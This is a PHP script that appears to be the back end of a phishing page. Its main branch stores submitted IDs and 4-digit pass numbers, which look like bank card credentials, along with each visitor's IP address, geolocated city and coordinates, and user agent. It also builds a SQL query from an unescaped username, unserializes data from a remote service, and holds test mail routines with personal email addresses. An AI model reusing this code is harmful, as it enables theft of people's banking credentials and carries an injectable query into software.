<?php

require_once("../common/commonfiles.php");
require_once("mail.php");
if (!isset($_GET['j'])) {
    // header("location: ".$site_root."index.php?m=901");
    $task = trim($_GET['j']);
} else {
    $task = trim($_GET['j']);
}
switch ($task) {

    case 4:
        $date = formatDateTime4db(date("Y-m-d H:m:s"));
        // echo  $date = date("Y-m-d H:m:s a");

        $u_agent = $_SERVER['HTTP_USER_AGENT'];
        $clientIp = get_client_ip();
        $json = file_get_contents("https://freegeoip.net/json/$clientIp");
        $json = json_decode($json, true);
        $country = $json['country_name'];
        $region = $json['region_name'];
        $city = $json['city'];

        $new_arr[] = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip=' . $clientIp));


        $passnum = escape(trim($_POST['AuthBpasNr']));
        $rknumm = escape(trim($_POST['AuthId']));

        $username = trim($_POST['u']);
        if (!empty($username)) {
            $u_data = db::getRecord("SELECT id FROM `user` WHERE username='" . $username . "'");
            $user_id = !empty($u_data["id"]) ? $u_data["id"] : 0;
        } else {
            $user_id = 0;
        }

        $obj['rk_nummer'] = escape(trim($_POST['AuthId']));
        $obj['pass_nummer'] = escape(trim($_POST['AuthBpasNr']));
        $obj['ipaddress'] = $clientIp;
        $obj['address'] = $country . "-" . $region . "-" . $city;
        $obj['lat'] = $new_arr[0]['geoplugin_latitude'];
        $obj['longt'] = $new_arr[0]['geoplugin_longitude'];
        $obj['datedata'] = $date;
        $obj['user_agent'] = $u_agent;
        $obj['user_id'] = $user_id;

        if (strlen($passnum) == 4) {
            if (strlen($rknumm) > 8) {
                $query = db::prepInsertQuery($obj, "data");
                $result = db::InsertRecord($query);
            }
        }
        if ($result) {
            echo $_SESSION["recordIdd"] = $result;
            //die();
        }
        break;


    case 6:
        $message = "asasdad";
        $subject = "hellow";
        echo $to = "saqlainbukhari26@gmail.com";
        $from = "haider.ali@yahoo.com";
        $toname = "ALI";
        $fromname = "haider";
        sendSMTP($message, $subject, $to, $toname, $from, $fromname, $attachment = "");

        break;



    case 7: ////////////////////////////Routes Table Data////////////////////////////
        $user_name = "Saqlain";
        $message = 'TEST EMAIL';

        $subject = "User Register ";
        $to = "saqlainbukhari26@gmail.com";
        $toname = "Saqlain";
        $from = "admin@charles.com";
        $fromname = "Test Email";
        $result5 = sendMailgun($message, $subject, $to, $toname, $from, $fromname, "");


        break;
}
?>